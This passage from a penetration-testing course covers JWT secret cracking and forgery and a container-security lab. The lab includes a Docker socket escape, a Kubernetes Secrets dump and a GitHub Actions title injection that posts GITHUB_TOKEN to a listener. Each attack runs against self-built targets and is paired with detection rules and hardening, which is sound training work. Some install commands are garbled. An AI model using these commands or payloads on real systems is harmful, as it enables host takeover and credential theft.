python3 -m venv venv && source venv/bin/activate
pip install flask pyjwt cryptography
18.2 Vulnerable App
cat > vuln.py <<'PY'
from flask import Flask, request, jsonify
import jwt, time
app = Flask(__name__)
SECRET = "sunshine"   # weak, in rockyou
@app.post("/login")
def login():
    d = request.get_json(force=True)
    if d.get("user") == "bob" and d.get("pw") == "bob":
        t = jwt.encode({"sub":"bob","role":"user","exp":int(time.time())+3600},
                       SECRET, algorithm="HS256")
        return jsonify(token=t)
    return "no", 401
@app.get("/admin")
def admin():
    tok = request.headers.get("Authorization","").split(" ")[-1]
    c = jwt.decode(tok, SECRET, algorithms=["HS256"])
    if c.get("role") != "admin":
        return "forbidden", 403
    return jsonify(secret="flag{jwt_weak_secret_owned}")
app.run(port=5001)
PY
python3 vuln.py &
sleep 1
18.3 Execute the Attack
# Log in as bob to obtain a token:
TOK=$(curl -s -X POST http://127.0.0.1:5001/login \
        -H 'Content-Type: application/json' \
        -d '{"user":"bob","pw":"bob"}' | jq -r .token)
echo "$TOK" > tok.jwt

# Crack the shared secret with hashcat:
hashcat -m 16500 -a 0 tok.jwt /usr/share/wordlists/rockyou.txt --quiet
# tok.jwt:sunshine

# Forge an admin token:
FORGED=$(python3 -c "
import jwt, time
print(jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600},
                 'sunshine', algorithm='HS256'))")

# Retrieve the flag:
curl -s http://127.0.0.1:5001/admin -H "Authorization: Bearer $FORGED"
# {"secret":"flag{jwt_weak_secret_owned}"}
18.4 Remediate to RS256 + JWKS Pinning
# Generate a keypair for the auth service:
openssl genrsa -out priv.pem 3072
openssl rsa -in priv.pem -pubout -out pub.pem

cat > safe.py <<'PY'
from flask import Flask, request, jsonify
import jwt, time
app = Flask(__name__)
PRIV = open("priv.pem","rb").read()
PUB  = open("pub.pem","rb").read()
KID_ALLOW = {"2026-01"}
ALG_ALLOW = {"RS256"}

@app.post("/login")
def login():
    d = request.get_json(force=True)
    if d.get("user") == "bob" and d.get("pw") == "bob":
        t = jwt.encode({"sub":"bob","role":"user",
                        "iss":"https://auth.lab","aud":"api.lab",
                        "exp":int(time.time())+900},
                       PRIV, algorithm="RS256", headers={"kid":"2026-01"})
        return jsonify(token=t)
    return "no", 401

@app.get("/admin")
def admin():
    tok = request.headers.get("Authorization","").split(" ")[-1]
    hdr = jwt.get_unverified_header(tok)
    if hdr.get("alg") not in ALG_ALLOW: return "bad alg", 401
    if hdr.get("kid") not in KID_ALLOW: return "bad kid", 401
    c = jwt.decode(tok, PUB, algorithms=list(ALG_ALLOW),
                   audience="api.lab", issuer="https://auth.lab",
                   options={"require":["exp","iss","aud","sub"]})
    if c.get("role") != "admin": return "forbidden", 403
    return jsonify(secret="flag{never_reached}")
app.run(port=5002)
PY
python3 safe.py &
18.5 Verify the Fix
# HS256 key confusion attempt with the published public key:
python3 -c "
import jwt, time
pub = open('pub.pem','rb').read()
print(jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+900,
                  'iss':'https://auth.lab','aud':'api.lab'},
                 pub, algorithm='HS256'))" > forged.jwt

curl -s http://127.0.0.1:5002/admin -H "Authorization: Bearer $(cat forged.jwt)"
# bad alg   ← algorithm pin rejects HS256.

# alg:none attempt:
FN=$(jwt_tool $(cat tok.jwt) -X a 2>/dev/null | grep -Eo '^eyJ[A-Za-z0-9._-]+' | head -1)
curl -s http://127.0.0.1:5002/admin -H "Authorization: Bearer $FN"
# bad alg

Screenshot both the successful attack on vuln.py and the rejected attack on safe.py. Both go in the report.
19. Exercises
19.1 Guided

Exercise 1 — Enumerate a Gateway. Given a target URL you own, run the fingerprinting flow from §2.3, then probe for backend leakage: DNS enumeration for api-internal.*, *.svc.cluster.local from a compromised host, and port scans of the internal /24. Document at least one host that answers on a non-gateway port.

Exercise 2 — Referrer Leak Reproduction. Stand up a page that authenticates via OAuth implicit flow, redirects to your callback, and includes a <img> tag pointing to an nginx you control. Inspect the nginx access log for the Referer header containing the fragment token. Write up why implicit flow was deprecated.

Exercise 3 — HS256 Weak-Secret Crack. Redo §11 end-to-end against a token you generate with the secret passw0rd!. Compare wall-clock crack time using rockyou.txt, rockyou + best64.rule, and a 6-character ?a?a?a?a?a?a mask.
19.2 Independent

Exercise 4 — Key Confusion in a Real Framework. Pick any HTTP framework you know (Express, FastAPI, Spring). Write both a vulnerable route (verifier picks algorithm from token) and a hardened route (algorithm pinned). Attack the vulnerable one with jwt_tool -X k. Deliver both routes and a short write-up.

Exercise 5 — Rate-Limit Bypass Study. Point Wallarm or ModSecurity in front of a small login endpoint. Implement one of: IP-per-request rotation, X-Forwarded-For spoofing, second-header injection. Measure the effective rate the limiter allows before and after your bypass. Explain what the limiter should have done.

Exercise 6 — Request Smuggling Discovery. Deploy nginx-in-front-of-gunicorn with default settings. Use smuggler.py to identify any CL.TE or TE.CL desync. If none exists, tune the reverse proxy until you introduce one, then measure how the WAF sees the request versus the origin.
20. Summary and Next Lesson

The API is one system with many defenders: an edge WAF, a gateway, an identity provider, a set of authorization checks, and every microservice behind them. Every layer has an attack surface, and every layer relies on another layer having done its job. The reliable path to a report-worthy finding runs along the seams: the header the gateway trusts, the algorithm the verifier does not pin, the path the WAF normalizes differently than the origin, the rate limit that keys on a spoofable value. A pentester who reads this stack the way an architect drew it is fast; one who reads it the way an attacker composes it is dangerous.

You should now be able to fingerprint any of the top-six gateways, diagram an OAuth 2.1 authorization code + PKCE flow from memory, decode and forge a JWT in three commands, crack an HS256 token with hashcat, and re-issue that same identity in a way the attacker cannot reach.

Next up, Lesson 12 — Service Mesh Security and East-West Traffic, moves inside the perimeter. We will look at Istio and Linkerd, at mesh-issued mTLS between services, at how Envoy's filter chain enforces per-service authorization, and at how attackers who already have a foothold in one pod pivot laterally to another with (or without) a valid SPIFFE identity.

































Lesson 12 — Lab: Container Security and Architecture Analysis

This capstone lab sequences four attacks that mirror what happens in real cloud-native breaches: a Docker socket escape, a Kubernetes misconfiguration exploited from a pod, a CI/CD supply-chain pattern via a poisoned GitHub Actions workflow, and a full architecture recon on a small multi-service stack.

Every challenge is paired with detection notes. Do not skip them — the point of this module is not only to run the escape, but to be able to write the Falco rule, Sysmon config, or OPA/Gatekeeper policy that would have caught you doing it.

Module diagram

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Module 04 has spent the previous eleven lessons pulling the container and cloud-native stack apart layer by layer: Linux namespaces and cgroups, the OCI runtime specification, image supply chains, Docker network internals, Kubernetes control-plane objects, service accounts and RBAC, admission controllers, CI/CD pipeline threat models, and the reverse-proxy / API-gateway / data-store topologies that most modern SaaS products stand on top of. Every lesson taught one slice — this one glues them together.

This lab consolidates the module. You will run four end-to-end challenges that chain container, cluster, pipeline, and application-tier weaknesses in the way a real adversary would, against controlled targets you build yourself. When you finish, your ~/pentest-tools/ repository will contain reproducible attack scripts, hardened re-runs proving each finding is fixed, and detection notes you can hand to a blue team. From Module 05 onward, every enumeration and exploitation lesson assumes you have this muscle memory.

The four challenges are:

    Docker escape via a mounted socket — abuse /var/run/docker.sock inside a container to spawn a privileged sibling and read the host's /etc/shadow.
    Kubernetes RBAC abuse — from a pod with an over-scoped ServiceAccount, list and exfiltrate every Secret in every namespace.
    CI/CD pipeline injection — weaponize a pull_request_target GitHub Actions workflow with an unsanitized ${{ github.event.pull_request.title }} sink to steal the GITHUB_TOKEN.
    Architecture recon on a live stack — from the outside, fingerprint an nginx → API → Postgres → Redis → Elasticsearch stack, find the unauthenticated Elasticsearch index that leaks credentials, and log into the API.

Each challenge follows the same shape: setup, objective, full walkthrough with exact commands and expected output, detection notes, and a stretch goal that hardens the misconfiguration and asks you to re-verify the exploit fails. Read the objective, try the exploit yourself, then check against the reference. Type the commands — do not paste them without reading. Break things intentionally and put them back together.
1. Lab Environment Setup
1.1 Host requirements

    Kali Linux 2026.1 VM (snapshot from Module 01 preferred)
    8 GB RAM minimum, 40 GB disk (the kind cluster is greedy)
    CPU virtualization enabled in the hypervisor; nested virt not required
    Outbound network reachability for image pulls
    A user in the docker group and passwordless sudo for cluster bring-up

1.2 Toolchain install

Run this once as your normal (non-root) user:
sudo apt update

    docker.io docker-compose-plugin \
    curl wget jq git tmux \

# Enable Docker without sudo

# Install kubectl 1.31.x from the upstream apt repo

  | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg
echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] \
  https://pkgs.k8s.io/core:/stable:/v1.31/deb/ /' \
  | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo apt update && sudo apt install -y kubectl

# kind (Kubernetes in Docker) v0.24.0
curl -Lo /tmp/kind https://kind.sigs.k8s.io/dl/v0.24.0/kind-linux-amd64

Verify each tool:

kube-hunter --help

1.3 Workspace layout
mkdir -p ~/pentest-tools/module04 ~/labs/module04
cd ~/pentest-tools
[ -d .git ] || git init
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip requests pyjwt
pip freeze > module04/requirements.txt

Every challenge writes its artifacts into ~/pentest-tools/module04/<challenge>/ and every lab-target manifest lives under ~/labs/module04/<challenge>/. Keep the two trees separated: attack tooling in the tools repo, target infrastructure in the labs tree.
2. Challenge 1 — Docker Escape via Mounted Socket
2.1 Threat model

A developer container in a legitimate CI runner mounts /var/run/docker.sock "so the pipeline can build images." An attacker with RCE inside that container inherits the ability to talk to the host Docker daemon, and the host Docker daemon runs as root. From there, mounting the host root filesystem into a fresh privileged container is trivial. This is the single most common container escape found in the wild.
2.2 Setup
mkdir -p ~/labs/module04/c1-docker-sock
cd ~/labs/module04/c1-docker-sock

docker-compose.yml:
version: '3.8'
services:
  dev-runner:
    image: alpine:3.20
    container_name: c1-dev-runner
    command: sh -c "apk add --no-cache docker-cli curl && sleep infinity"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    restart: unless-stopped

Bring it up:
docker compose up -d
docker compose ps

Expected:
NAME            IMAGE          COMMAND                  STATUS
c1-dev-runner   alpine:3.20    "sh -c 'apk add --n…'"   Up 4 seconds

Sanity: the container should have a working docker client and see the daemon:
docker exec -it c1-dev-runner sh -c "docker version --format '{{.Server.Version}}'"
# → 25.x.x   (this is the *host* daemon speaking, not a nested one)
2.3 Objective

From inside c1-dev-runner, escape to the host and print the first line of the host's /etc/shadow. You have no host account, no SSH key, no sudo — just the mounted socket.
2.4 Walkthrough

Open a shell in the compromised container:
docker exec -it c1-dev-runner sh

Inside the container, confirm the escape primitive is present:
ls -l /var/run/docker.sock
# srw-rw---- 1 root root 0 Sep  4 12:00 /var/run/docker.sock

Spawn a privileged sibling that bind-mounts the host root filesystem at /host:
docker run --rm -it \
    --privileged \
    --pid=host \
    -v /:/host \
    alpine:3.20 chroot /host /bin/sh

You now hold a root shell on the host. Verify:
hostname                 # your Kali VM's hostname, not the container id
id                       # uid=0(root) gid=0(root)
head -n 1 /etc/shadow
# root:$y$j9T$...       ← proof of escape

Save the proof back to the attack repo (from your normal Kali user, in another terminal):
mkdir -p ~/pentest-tools/module04/c1-docker-sock
docker exec c1-dev-runner sh -c '
  docker run --rm --privileged -v /:/host alpine:3.20 \
    chroot /host /bin/sh -c "head -n1 /etc/shadow"
' | tee ~/pentest-tools/module04/c1-docker-sock/proof.txt

Expected proof.txt:
root:$y$j9T$abcdefghijklmnop...:19876:0:99999:7:::
2.5 Why it works

The docker CLI in the container talks to the daemon over the mounted UNIX socket. The daemon does not know or care that the request came from a container — it authenticates by socket ownership, and the socket is world-writable to the docker group. --privileged disables the default seccomp/AppArmor profiles and grants every capability; -v /:/host bind-mounts the host root; chroot /host steps into it. The container boundary evaporates.
2.6 Detection notes

Falco rule (~/pentest-tools/module04/c1-docker-sock/falco-docker-sock.yaml):
- rule: Docker socket mounted into container
  desc: Detect containers started with /var/run/docker.sock bind-mounted
  condition: >
    container.id != host and
    proc.name = docker and
    proc.args contains "run" and
    (proc.args contains "docker.sock" or proc.args contains "--privileged")
  output: >
    Docker-in-Docker escape attempt
    (user=%user.name container=%container.id cmd=%proc.cmdline)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

auditd rule (/etc/audit/rules.d/docker-sock.rules):
-w /var/run/docker.sock -p rwxa -k docker_sock_access

Reload rules and watch:
sudo augenrules --load
sudo auditctl -l
sudo ausearch -k docker_sock_access --start recent | head -n 20

You should see one SYSCALL record per container access to the socket, including the caller pid, uid, and comm — enough to correlate with the offending pod or workload id.
2.7 Stretch — remove the socket mount and confirm the escape breaks

Edit the compose file, deleting the volumes: block, and recreate:
sed -i '/volumes:/,/docker.sock/d' docker-compose.yml
docker compose up -d --force-recreate

Re-run the exploit from inside the container:
docker exec -it c1-dev-runner sh -c 'docker run --rm alpine:3.20 echo pwned'

Expected failure output:
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?

The escape primitive is gone. Commit the negative-test transcript:
docker exec c1-dev-runner sh -c 'docker ps 2>&1' \
  > ~/pentest-tools/module04/c1-docker-sock/hardened-negative.txt
git -C ~/pentest-tools add module04/c1-docker-sock
git -C ~/pentest-tools commit -m "c1: docker socket escape proof + hardened negative"

Tear down:
docker compose down
3. Challenge 2 — Kubernetes Misconfiguration Exploitation
3.1 Threat model

A well-meaning platform engineer binds an application's ServiceAccount to a ClusterRole granting get,list secrets cluster-wide — perhaps to let an operator read TLS material. Anyone who lands RCE in that pod inherits the token, and the token is a first-class credential to the API server. Cluster-wide Secret read is game over: it exposes every ImagePullSecret, every application password, every service-mesh JWT signing key.
3.2 Setup
mkdir -p ~/labs/module04/c2-k8s-rbac
cd ~/labs/module04/c2-k8s-rbac

kind-cluster.yaml:
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: m04-lab
nodes:
  - role: control-plane
  - role: worker

Bring the cluster up:
kind create cluster --config kind-cluster.yaml
kubectl cluster-info --context kind-m04-lab
kubectl get nodes

Expected:
NAME                    STATUS   ROLES           AGE   VERSION
m04-lab-control-plane   Ready    control-plane   30s   v1.31.0
m04-lab-worker          Ready    <none>          20s   v1.31.0

Seed a handful of interesting Secrets across three namespaces:
for ns in dev staging prod; do
  kubectl create namespace "$ns"
  kubectl -n "$ns" create secret generic app-db \
      --from-literal=username=svc_"$ns" \
      --from-literal=password="p@ss_${ns}_$(openssl rand -hex 4)"
done
kubectl -n prod create secret generic stripe-api \
    --from-literal=key=sk_live_$(openssl rand -hex 12)

Now the deliberately over-scoped RBAC and the victim pod. victim.yaml:
apiVersion: v1
kind: ServiceAccount
metadata:
  name: victim-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: read-all-secrets
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: victim-sa-read-secrets
subjects:
  - kind: ServiceAccount
    name: victim-sa
    namespace: default
roleRef:
  kind: ClusterRole
  name: read-all-secrets
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: victim
  namespace: default
spec:
  serviceAccountName: victim-sa
  containers:
    - name: shell
      image: alpine:3.20
      command: ["sh", "-c", "apk add --no-cache curl jq && sleep infinity"]

Apply:
kubectl apply -f victim.yaml
kubectl wait --for=condition=Ready pod/victim --timeout=90s
3.3 Objective

From a shell inside the victim pod — no kubectl binary, no kubeconfig — enumerate every Secret in every namespace, and dump the value of prod/stripe-api.
3.4 Walkthrough

Drop into the pod:
kubectl exec -it victim -- sh

Confirm the mounted ServiceAccount token and the API server address:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# What am I?
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
    $APISERVER/apis/authentication.k8s.io/v1/selfsubjectreview \
    -H "Content-Type: application/json" \
    -X POST -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' \
  | jq .status.userInfo

Expected:
{
  "username": "system:serviceaccount:default:victim-sa",
  "uid": "…",
  "groups": [
    "system:serviceaccounts",
    "system:serviceaccounts:default",
    "system:authenticated"
  ]
}

List every Secret cluster-wide:
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/secrets \
  | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'

Expected (order may vary):
default/kube-root-ca.crt
dev/app-db
kube-system/bootstrap-token-…
prod/app-db
prod/stripe-api
staging/app-db
…

Dump the target Secret:
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/prod/secrets/stripe-api \
  | jq -r '.data.key' | base64 -d

Expected:
sk_live_9b1c…                 ← plaintext Stripe key

Exit the pod. Persist the proof:
kubectl exec victim -- sh -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
       -H "Authorization: Bearer $TOKEN" \
       https://kubernetes.default.svc/api/v1/namespaces/prod/secrets/stripe-api \
    | jq -r ".data.key" | base64 -d
' | tee ~/pentest-tools/module04/c2-k8s-rbac/prod-stripe.txt
3.5 Detection notes

Everything you did shows up in the API-server audit log. On kind, the audit policy is not on by default — enable it for the lesson:
docker exec m04-lab-control-plane sh -c '
  grep -q audit-log-path /etc/kubernetes/manifests/kube-apiserver.yaml \
    || echo "audit not configured"
'

Ask the kubelet for the last 200 events touching Secrets from a non-system account:
kubectl get events -A --field-selector reason=SecretRead 2>/dev/null | head

A production cluster with audit enabled would pattern-match this call sequence: many list on secrets from system:serviceaccount:default:victim-sa, spread across namespaces, from a pod IP — a Falco k8s_audit rule catches it inside a minute.
3.6 Stretch — deny the binding with OPA Gatekeeper

Install Gatekeeper 3.17:
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/v3.17.0/deploy/gatekeeper.yaml
kubectl -n gatekeeper-system wait --for=condition=Available deploy --all --timeout=180s

Constraint template that forbids Pod ServiceAccounts bound to read-all-secrets:

no-cluster-secrets.yaml:
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8snoclustersecretsbinding
spec:
  crd:
    spec:
      names:
        kind: K8sNoClusterSecretsBinding
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8snoclustersecretsbinding

        forbidden_role := "read-all-secrets"

        violation[{"msg": msg}] {
          input.review.kind.kind == "Pod"
          sa := input.review.object.spec.serviceAccountName
          crb := data.inventory.cluster["rbac.authorization.k8s.io/v1"].ClusterRoleBinding[_]
          crb.roleRef.name == forbidden_role
          some i
          crb.subjects[i].kind == "ServiceAccount"
          crb.subjects[i].name == sa
          crb.subjects[i].namespace == input.review.object.metadata.namespace
          msg := sprintf("Pod SA %q is bound to forbidden ClusterRole %q",
                         [sa, forbidden_role])
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sNoClusterSecretsBinding
metadata:
  name: block-cluster-secrets
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]

Apply and re-verify:
kubectl apply -f no-cluster-secrets.yaml
kubectl delete pod victim
kubectl apply -f victim.yaml

Expected admission rejection:
Error from server (Forbidden): error when creating "victim.yaml":
admission webhook "validation.gatekeeper.sh" denied the request:
[block-cluster-secrets] Pod SA "victim-sa" is bound to forbidden ClusterRole "read-all-secrets"

Commit the diff and tear down:
git -C ~/pentest-tools add module04/c2-k8s-rbac
git -C ~/pentest-tools commit -m "c2: k8s rbac secret dump + gatekeeper denial"
kind delete cluster --name m04-lab
4. Challenge 3 — CI/CD Pipeline Attack Simulation
4.1 Threat model

pull_request_target runs a workflow in the base repository's context with write access to secrets, but with the head repository's untrusted metadata. Any expression like ${{ github.event.pull_request.title }} interpolated directly into a run: block gives an external attacker shell in a trusted CI environment. From there the GITHUB_TOKEN — and typically anything else in secrets.* — is a curl away.
4.2 Setup
mkdir -p ~/labs/module04/c3-cicd/.github/workflows
cd ~/labs/module04/c3-cicd
git init -q

Vulnerable workflow — .github/workflows/welcome.yml:
name: welcome-contributor
on:
  pull_request_target:
    types: [opened]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Say hi
        run: |
          echo "New PR titled: ${{ github.event.pull_request.title }}"

Fake event payload — event.json (this is the malicious PR):
{
  "action": "opened",
  "pull_request": {
    "number": 42,
    "title": "hi\"; curl -s -X POST -d \"token=$GITHUB_TOKEN\" http://172.17.0.1:9000/exfil; echo \"",
    "user": {"login": "attacker"}
  },
  "repository": {
    "full_name": "victim/repo",
    "default_branch": "main"
  }
}

Start an exfil listener on the Kali host:
mkdir -p ~/pentest-tools/module04/c3-cicd
cd ~/pentest-tools/module04/c3-cicd
python3 -m http.server 9000 --bind 0.0.0.0 \
    2>&1 | tee exfil.log &
LISTENER_PID=$!
4.3 Objective

Run the workflow locally with act, driving it with event.json, and capture the GITHUB_TOKEN on your listener.
4.4 Walkthrough

Provide a fake token and run act against the pull_request_target event:
cd ~/labs/module04/c3-cicd
echo "GITHUB_TOKEN=ghs_FAKE_LAB_TOKEN_$(openssl rand -hex 8)" > .secrets

act pull_request_target \
    -e event.json \
    --secret-file .secrets \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest

Expected act output (trimmed):
[welcome-contributor/greet] Start image=catthehacker/ubuntu:act-latest
[welcome-contributor/greet]   Run Say hi
| New PR titled: hi
| % Total    % Received % Xferd  Average Speed
| 100    64  100    22  100    42  ...
| 
[welcome-contributor/greet]   Success - Say hi

Check the listener log:
cat ~/pentest-tools/module04/c3-cicd/exfil.log

Expected:
172.17.0.2 - - [04/Sep/2026 12:20:15] "POST /exfil HTTP/1.1" 501 -
172.17.0.2 - - [04/Sep/2026 12:20:15]
    "POST /exfil HTTP/1.1" body: token=ghs_FAKE_LAB_TOKEN_9b1c2e3f4a5b6c7d

The workflow evaluated the attacker-controlled title inside a bash -c context. The " closed the initial echo string, the ; chained a curl, $GITHUB_TOKEN was interpolated by bash (not by GitHub Actions), and the token flew out over HTTP.
4.5 Detection

    CodeQL Actions scanner — github/codeql-action ships a query pack actions/actions-injection that flags any ${{ github.event.* }} expression reaching a run: script. Add to .github/workflows/codeql.yml:

    - uses: github/codeql-action/init@v3
      with:
        languages: actions
    - uses: github/codeql-action/analyze@v3

    Expected finding:

    actions/injection: 'github.event.pull_request.title' flows into a run
      step (welcome.yml:9). Severity: high.

    GitHub secret scanning — GitHub push-protection will refuse a commit containing a ghs_ or ghp_ token in the exfil log if you accidentally push it. Verify your .gitignore excludes exfil.log and .secrets.

    Runner egress control — a hardened runner in a corp environment blocks outbound traffic to non-allow-listed hosts. The listener call would fail with curl: (7) Failed to connect.

4.6 Stretch — sanitize the sink

Rewrite the workflow so the untrusted string is passed through an environment variable, which bash treats as data, never as code:
name: welcome-contributor
on:
  pull_request_target:
    types: [opened]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Say hi
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          printf 'New PR titled: %s\n' "$PR_TITLE"

Re-run:
act pull_request_target -e event.json \
    --secret-file .secrets \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest

Expected — the payload prints verbatim and does not execute:
| New PR titled: hi"; curl -s -X POST -d "token=$GITHUB_TOKEN" http://172.17.0.1:9000/exfil; echo "

Kill the listener and commit both versions of the workflow, plus the exfil transcript:
kill "$LISTENER_PID" 2>/dev/null
cp -r ~/labs/module04/c3-cicd/.github ~/pentest-tools/module04/c3-cicd/
git -C ~/pentest-tools add module04/c3-cicd
git -C ~/pentest-tools commit -m "c3: pull_request_target injection + env-var fix"
5. Challenge 4 — Architecture Recon on a Live Lab Stack
5.1 Threat model

A "3-tier" SaaS in the real world is rarely three tiers. There is nginx in front, a REST API, a primary datastore, one or two caches, a search engine, an object store, a queue, and a handful of admin dashboards. Each service is a potential entry point, and one weak link — an Elasticsearch bound to 0.0.0.0 with xpack.security.enabled=false — is enough to unravel the rest.
5.2 Setup
mkdir -p ~/labs/module04/c4-stack/{nginx,api}
cd ~/labs/module04/c4-stack

docker-compose.yml:
version: '3.8'
networks:
  stack:
    driver: bridge
    ipam:
      config:
        - subnet: 172.24.0.0/24
services:

  nginx:
    image: nginx:1.27
    container_name: c4-nginx
    volumes:
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf:ro
    ports:
      - "8080:80"
    networks: [stack]

  api:
    image: python:3.12-slim
    container_name: c4-api
    working_dir: /app
    volumes:
      - ./api:/app
    command: sh -c "pip install --quiet flask==3.0.3 psycopg2-binary redis && python app.py"
    networks: [stack]

  postgres:
    image: postgres:16
    container_name: c4-postgres
    environment:
      POSTGRES_USER: app
      POSTGRES_PASSWORD: app_password
      POSTGRES_DB: appdb
    ports:
      - "5432:5432"                       # deliberate: exposed to host
    networks: [stack]

  redis:
    image: redis:7
    container_name: c4-redis
    command: ["redis-server", "--protected-mode", "no"]   # deliberate
    ports:
      - "6379:6379"
    networks: [stack]

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.15.0
    container_name: c4-es
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false      # deliberate
      - ES_JAVA_OPTS=-Xms512m -Xmx512m
    ports:
      - "9200:9200"                       # deliberate: unauth on the internet
    networks: [stack]

nginx/default.conf:
server {
  listen 80;
  server_name _;
  location / { proxy_pass http://api:5000; }
}

api/app.py:
from flask import Flask, request, jsonify
import redis

app = Flask(__name__)
USERS = {"admin": "S3cret_lab_pw!"}     # loaded into ES on boot
r = redis.Redis(host="redis", port=6379, decode_responses=True)

@app.route("/")
def index():
    return "lab-api v1", 200

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(force=True)
    if USERS.get(data.get("user")) == data.get("pass"):
        return jsonify(ok=True, role="admin"), 200
    return jsonify(ok=False), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

Bring the stack up:
docker compose up -d
docker compose ps

Seed Elasticsearch with a leaky index (run once, after ES is healthy):
until curl -sf http://127.0.0.1:9200/_cluster/health >/dev/null; do sleep 2; done

curl -s -X POST http://127.0.0.1:9200/app-users/_doc \
    -H 'Content-Type: application/json' \
    -d '{"user":"admin","pass":"S3cret_lab_pw!","note":"prod-mirror seed"}'
curl -s -X POST http://127.0.0.1:9200/app-users/_doc \
    -H 'Content-Type: application/json' \
    -d '{"user":"alice","pass":"alice-2025","note":"customer"}'
curl -s http://127.0.0.1:9200/app-users/_refresh
5.3 Objective

Assume you know only that http://127.0.0.1:8080/ is exposed. Fingerprint the whole stack, discover the unauthenticated Elasticsearch on 9200, dump the app-users index, and use the credentials to log into the API through nginx.
5.4 Walkthrough

Step 1 — fingerprint the front door.
whatweb -a 3 http://127.0.0.1:8080/

Expected:
http://127.0.0.1:8080/ [200 OK] HTTPServer[nginx/1.27], nginx[1.27]

Step 2 — sweep the host for other listeners. In a real engagement this is a targeted range scan; here we scan the loopback of the lab VM.
sudo nmap -sS -p- --min-rate 2000 -Pn 127.0.0.1 -oN scan.txt

Expected (trimmed):
PORT     STATE SERVICE
5432/tcp open  postgresql
6379/tcp open  redis
8080/tcp open  http
9200/tcp open  wap-wsp

Re-scan the interesting ports with service and script probes:
sudo nmap -sV -sC -p 5432,6379,9200 127.0.0.1

Expected:
5432/tcp open  postgresql PostgreSQL DB 16
6379/tcp open  redis      Redis key-value store 7.x
9200/tcp open  http       Elasticsearch REST API 8.15.0
| http-title: Site doesn't have a title (application/json)

Step 3 — verify Elasticsearch is unauthenticated.
curl -s http://127.0.0.1:9200/ | jq .

Expected:
{
  "name": "c4-es",
  "cluster_name": "docker-cluster",
  "version": {"number": "8.15.0", "build_flavor": "default"}
}

The absence of a 401 on the root document is the tell. Enumerate indices:
curl -s 'http://127.0.0.1:9200/_cat/indices?v'

Expected:
health status index      uuid                   pri rep docs.count store.size
green  open   app-users  Wg4Bx3XyR2y…             1   0          2      6.4kb

Step 4 — dump the index.
mkdir -p ~/pentest-tools/module04/c4-stack
cd ~/pentest-tools/module04/c4-stack
elasticdump \
    --input=http://127.0.0.1:9200/app-users \
    --output=./app-users.json \
    --type=data

Expected (trimmed):
Wed, 04 Sep 2026 12:44:01 GMT | starting dump
Wed, 04 Sep 2026 12:44:01 GMT | got 2 objects from source elasticsearch
Wed, 04 Sep 2026 12:44:01 GMT | sent 2 objects to destination file, wrote 2
Wed, 04 Sep 2026 12:44:01 GMT | Total Writes: 2

Inspect:
jq -r '._source | "\(.user):\(.pass)"' app-users.json

Expected:
admin:S3cret_lab_pw!
alice:alice-2025

Step 5 — log into the API.
curl -s -X POST http://127.0.0.1:8080/login \
    -H 'Content-Type: application/json' \
    -d '{"user":"admin","pass":"S3cret_lab_pw!"}'

Expected:
{"ok":true,"role":"admin"}

Chain complete: outside-in recon → unauthenticated Elasticsearch → credential dump → admin login on the API through nginx.
5.5 Detection notes

    Elasticsearch access log — every _cat/indices and _search from a non-loopback address is a signal. In prod, ship elasticsearch.log to a SIEM and alert on path=/_search from unexpected client IPs.
    nginx access log — the pre-auth recon shows up as many small POST /login attempts with varying JSON payloads; rate-limit on limit_req_zone and alert on 401 bursts.
    Redis — MONITOR from a compromised app node is a common exfil path; disable it (rename-command MONITOR "") and log CONFIG GET on the server side.
    Postgres — enable log_connections=on and alert on connections from an unexpected client CIDR.

5.6 Stretch — harden everything and re-run recon

Edit docker-compose.yml:
  postgres:
    # remove the `ports:` block entirely → no host exposure
  redis:
    command: ["redis-server", "--requirepass", "R3dis_hard!", "--protected-mode", "yes"]
    # remove `ports:` too
  elasticsearch:
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=true
